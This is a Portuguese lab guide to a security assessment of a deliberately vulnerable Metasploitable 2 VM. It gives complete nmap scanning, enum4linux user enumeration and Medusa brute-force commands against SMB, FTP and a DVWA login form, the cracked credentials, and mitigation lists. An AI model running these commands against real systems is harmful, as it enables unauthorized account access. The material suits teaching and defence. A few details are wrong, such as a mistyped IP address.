# Análise de segurança em rede e intranet local
Este documento descreve a realização de uma análise de segurança em uma rede local virtual privada em ambiente controlado, destinado para fins educacionais.
Os testes são realizados totalmente em ambiente Linux.


## Ferramentas necessárias ##
* Oracle Virtual Box => gerenciador de máquinas virtuais
* Kali Linux => distribuição do Linux preparada com ferramentas específicas destinadas a realização de testes de segurança
* Metasploitable 2.0 => ambiente Linux com aplicações que possuem brechas de segurança propositais, destinada ao aprendizado na área de segurança da informação.
* nmap => ferramenta que permite realizar uma varredura na rede em busca de portas, serviços e detalhes sobre versões e sistema operacional
* enum4linux => ferramenta de varredura de enumeração que realiza a busca de usuários na rede
* Medusa => ferramenta que realiza testes de segurança de login


## Instalar o Oracle Virtual Box
- Disponível em https://www.virtualbox.org/wiki/Linux_Downloads
- Realizar o download do arquivo de acordo com a versão do Linux.
- Realizar a instalação do Virtual Box no terminal do Linux:
  sudo dpkg -i virtualbox_XX.deb
  
  
## Configurar a rede local no Virtual Box
- Iniciar o Virtual Box e ir para o menu Aquivo > Ferramentas > Rede > Clique em Criar. 
Dessa forma uma nova rede do tipo (host-only) será configurada (vboxnet0) para ser compartilhada somente entre os hosts internos.


## Instalar o Kali Linux no Virtual Box
- Disponível em https://www.kali.org/get-kali/#kali-virtual-machines
- Realizar o download da versão do Kali Linux para Virtual Box
- Descompactar o arquivo 
- No Virtual Box clique no botão Open (+) e selecione o arquivo com extensão .vbox que está no diretório que foi descompactado anteriormente, clique em ok para criar a máquina virtual
- Selecione a máquina virtual Kali Linux que foi acionada, clique no botão configurações da barra de botões > selecione a Rede, em seguida selecionar > placa de rede exclusiva de hospedeiro (host-only) e selecionar o nome da rede (vboxnet0)
 que foi configurada no passo anterior
 
 
## Instalar o Metasploitable 2.0 no Virtual Box
- Baixar o Metasploitable 2.0 via source forge
- Descompactar o arquivo baixado
- No Virtual Box ir em Novo para criar uma nova maquina virtual , selecionando sistema operacional Linux.
- Selecione a máquina virtual que foi adicionada, clique em configurações > armazenamento > controladora IDE ou SATA > add hard disk > selecione o arquivo .vmdk



## Iniciar as máquinas virtuais
- No Oracle Virtual Box > selecione a maquina virtual KaliLinux e clique em iniciar
- Fazer o login 
- No Oracle Virtual Box > selecione a maquina virtual Metasploitable e clique em iniciar
- Fazer o login (kali /kali)



### Descubrir o ip da maquina virtual do Metasploitable 
```
ip a
```


### Checar a conexão com a máquina virtual Metasploitable através do Kali Linux 
```
ping -c 3 192.68.56.102
```


# Procedimentos de reconhecimento da rede através da enumeração ##



## Encontrar as portas abertas e as versões dos serviços em uso
```
nmap -sV -p  21,22,80,139,445  192.168.56.102
```

#### Descrição dos comandos
* -sV => descobre a versão do serviço
* -p  => define as portas de acordo com o serviço 21(ftp), 22(ssh), 80(http), 139(smb), 445(smb)
* 192.168.56.102 => ip de pesquisa

#### Resultado

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:53:20:DF (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
#### Resumo
Após a realização da varredura é possível visualizar serviços abertos: ftp, ssh, http, netbios-ssn e suas respectivas versões. Também é possível visualizar a versão do sistema operacional.

<br>
<br>

## Montar uma lista de usuários da rede através da varredura da rede
```
enum4linux -U 192.168.56.102 -a |  grep -Po 'user:\[\K[^]]+'  > user_local.txt
```
#### Descrição dos comandos
* -U => extrai a lista de usuários
* -a => utiliza todas as possibilidades de varredura
* grep -Po 'user:\[\K[^]]+'  => filtra o nome do usuário pelo padrão user:[usuario]
* user_local.txt => salva a lista de usuários no arquivo txt

<br>
<br>


## Criar uma lista de password com os nomes dos usuarios e password comuns
```
{ cat user_local.txt ; echo "password\n123456\nWelcome123";  }  > pass_local.txt
```
#### Descrição dos comandos
* { cat user_local.txt ;  => exibe a lista de usuarios
* echo "password\n123456\nWelcome123"; }   => lista de password comuns

<br>
<br>


## Realizar teste de acesso SMB com a ferramenta Medusa, utilizando os dados obtidos na varredura + dados comuns
```
medusa -h 192.168.56.102 -U user_local.txt -P pass_local.txt -M smbnt -t 2 -T 50 | grep SUCCESS
```
#### Descrição dos comandos
* -U => lista de usuários
* -P => lista de senhas
* -M => serviço a ser testado
* -t => numero de threads
* -T => numero de hosts simultâneos a ser testado em paralelo

#### Resultado
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: user Password: user [SUCCESS (ADMIN$ - Access Allowed)]
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```
<br>
<br>

## Realizar teste de acesso FTP com a ferramenta Medusa, utilizando os dados obtidos na varredura + dados comuns
```
medusa -h 192.168.56.102 -U user_local.txt -P pass_local.txt -M ftp -t 6 | grep SUCCESS
```
#### Descrição dos comandos
* -h => host
* -U => lista de usuários
* -P => lista de senhas
* -M => serviço a ser testado
* -t => numero de threads

#### Resultado
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: user Password: user [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: postgres Password: postgres [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: service Password: service [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: ftp Password: games [SUCCESS]
```
<br>
<br>


## Mitigação de ataque contra login em serviços de rede usando força bruta 

* Monitoramento de logs com alertas 
* Utilizar ferramentas do Linux como auditclt para acompanhar alterações em arquivos e diretórios
* Realizar o bloqueio automático do login, após várias tentativas de login incorretas
* Remover os serviços que não forem mais utilizados
* Atualizar periodicamente os serviços com as últimas versões disponíveis
* Utilizar serviços mais modernos e seguros para transferência de arquivos (SFTP)
* Aplicar a política de troca periódica de senha 

<br>
<br>

## Procedimentos de testes em ambiente intranet ##


# Testar o login de sistema intranet web com a ferramenta Medusa
```
medusa -h 192.168.56.102 -U user_local.txt -P pass_local.txt -M http \
-m PAGE : "/dvwa/login.php" \
-m FORM: "username=^USER^&password=^PASS^&Login=Login" \
-m "FAIL=Login failed" -t 6 \
| grep SUCCESS
```
#### Descrição dos comandos
* -h => host
* -U => lista de usuários
* -P => lista de senhas
* -M => serviço a ser testado
* -t => numero de threads

#### Resultado
```
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```
<br>
<br>

## Mitigação de ataque contra login em sites usando força bruta 

* Limitar a tentativa de login por ip
* Adicionar captha na tela de login
* Adicionar validação de acesso em 2 fatores
* Bloquear acesso após um limite de tentativas incorretas
* Adicionar um token CSRF para cada requisição, como implementado no framework Django
* Validação de cookies no servidor
* Monitoramento de logs







 
